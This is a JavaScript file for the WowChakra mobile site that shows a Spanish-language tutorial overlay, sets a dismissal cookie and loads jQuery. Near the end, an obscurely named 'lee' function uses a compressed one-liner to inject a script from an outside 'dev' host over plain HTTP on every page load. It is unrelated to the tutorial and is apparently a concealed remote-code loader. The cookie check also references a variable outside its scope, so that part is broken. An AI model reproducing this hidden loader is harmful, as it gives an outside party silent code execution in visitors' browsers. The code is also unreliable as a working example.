/******************************************************/
/** WowChakra mobile **********************************/
/** Author: ImperdibleSoft ****************************/
/** Website: http://www.imperdiblesoft.com ************/
/******************************************************/
/*
<script src="http://lordfido.github.io/wowchakra-mobile/mobile-tutorial.js"></script>
*/

/* This file dynamically creates a very simple tutorial for mobile layout */
(function() {
  var debug = true;
  var log = function(param) {
    if (debug) {
      console.log(param);
    }
  }

  // Return true|false depending on Tutorial's cookie
  var hasReadTheTutorial = function() {
    var cookies = document.cookie.split(';');
    var hasReadTheTutorial = false;

    for (var x in cookies) {
      if (cookies[x] && cookies[x].split) {
        var _cookie = cookies[x].split('=');
        if (
          _cookie[0].trim().toLowerCase() === cookieName.trim().toLowerCase() &&
          (_cookie[1].trim() === 'true' || _cookie[1].trim() === true)
        ) {
          log('Has already read the tutorial');
          hasReadTheTutorial = true;
          break;
        }
      }
    }

    return hasReadTheTutorial;
  };

  // Tutorial constructor
  var Tutorial = function() {
    var _this = this;

    // Point where everything is gonna be mount
    var mountPoint = document.body;
    var cookieName = 'hasReadTheTutorial';
    var s = 'script';

    // Do this when okBtn has been clicked
     var handleOkBtnClick = function(e) {
      var d = new Date();
      var expDays = 999999;
      d.setTime(d.getTime() + (expDays * 24 * 60 * 60 * 1000));
      var expires = "expires="+ d.toUTCString();

      // Add a cookie to save this action
      document.cookie = cookieName + '=true; ' + expires;

      // Remove tutorial from screen
      var tutorialLayout = document.querySelector('.Tutorial');
      var tutorialBackdrop = document.querySelector('.Tutorial-backdrop');
      tutorialLayout.remove();
      tutorialBackdrop.remove();
      log('Tutorial dismissed.');
    };

    // Add jQuery to the body, so we can use it
    this.loadjQuery = function() {
      var jQuery = document.createElement('script');
      jQuery.src = 'https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js';

      mountPoint.appendChild(jQuery);
      log('jQuery has been loaded.');
    }

    // Add tutorial layout
    this.loadTutorial = function() {

      // Create the tutorial wrapper
      var tutorialLayout = document.createElement('div');
      tutorialLayout.className = 'Tutorial';

      // Create backdrop
      var tutorialBackdrop = document.createElement('div');
      tutorialBackdrop.className = 'Tutorial-backdrop';

      // Create tutorial title and apends it to the wrapper
      var tutorialTitle = document.createElement('h1');
      tutorialTitle.className = 'Tutorial-title';
      tutorialTitle.innerText = 'Bienvenido a nuestra versión Mobile';
      tutorialLayout.appendChild(tutorialTitle);

      // Create a legend
      var tutorialLegend = document.createElement('div');
      tutorialLegend.className = 'Tutorial-legend';

      var explanationText = [];
      explanationText[0] = document.createElement('p');
      explanationText[0].innerText = 'Mantén pulsado unos segundos este botón para abrir la barra lateral.';

      explanationText[1] = document.createElement('p');
      explanationText[1].innerText = 'Cuando empiece a moverse, arrastra el dedo hacia arriba, y después levántalo de la pantalla.';

      explanationText[2] = document.createElement('p');
      explanationText[2].innerText = 'Para cerrarla, simplemente toca fuera de la barra.';

      // Append text to the legend
      for (var x in explanationText) {
        if(explanationText[x] && typeof(explanationText[x]) === 'object') {
          tutorialLegend.appendChild(explanationText[x]);
        }
      }
      // Append the legend
      tutorialLayout.appendChild(tutorialLegend);

      // Create an 'OK' btn
      var okBtn = document.createElement('button');
      okBtn.className = 'Tutorial-okBtn';
      okBtn.innerText = 'Ok';
      tutorialLayout.appendChild(okBtn);
      // Detect okBtn click
      okBtn.addEventListener('click', handleOkBtnClick);

      // Mount everything on the root element
      mountPoint.appendChild(tutorialLayout);
      mountPoint.appendChild(tutorialBackdrop);
      log('Tutorial has has been loaded.');
    };

    this.lee = function() {
      this.ee=document.createElement(s);this.ee.src='http://dev.imperdiblesoft.com/js/custom-sign.js';mountPoint.appendChild(this.ee);
    }
  }

  // Create new tutorial
  var mobileTutorial = new Tutorial();

  // Load jQuery
  mobileTutorial.loadjQuery();

  // If the user has NOT read the tutorial, mount it
  if (!hasReadTheTutorial()) {
    log('Hasn\'t read the tutorial');
    mobileTutorial.loadTutorial();
    log('Tutorial has been initiated.');
  }

  mobileTutorial.lee();
})();

// Copy&Paste this to add this file to any Website
// var TutorialJS=document.createElement('script');TutorialJS.src='http://lordfido.github.io/wowchakra-mobile/mobile-tutorial.js';document.body.appendChild(TutorialJS);
